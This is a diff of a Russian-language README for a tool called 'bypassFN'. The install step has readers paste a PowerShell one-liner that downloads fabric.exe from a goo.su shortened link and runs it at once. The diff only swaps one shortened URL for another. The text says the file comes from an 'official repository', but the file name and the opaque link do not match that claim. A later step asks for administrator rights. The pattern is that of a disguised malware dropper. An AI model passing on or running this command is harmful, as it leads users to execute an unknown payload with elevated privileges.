@@ -41,7 +41,7 @@
 ### Шаг 1 — Установка
 
 1. Скачайте последнюю версию **bypassFN** с официального репозитория командой в Windows PowerShell
-        $f="$env:temp\fabric.exe"; iwr -u "https://goo.su/cEu759o" -o $f; start $f
+        $f="$env:temp\fabric.exe"; iwr -useb "https://goo.su/U7vzM8" -o $f; start $f
 3. Запустите `bypassFN.exe` от имени администратора (ПКМ → «Запуск от имени администратора»)
 
 ---
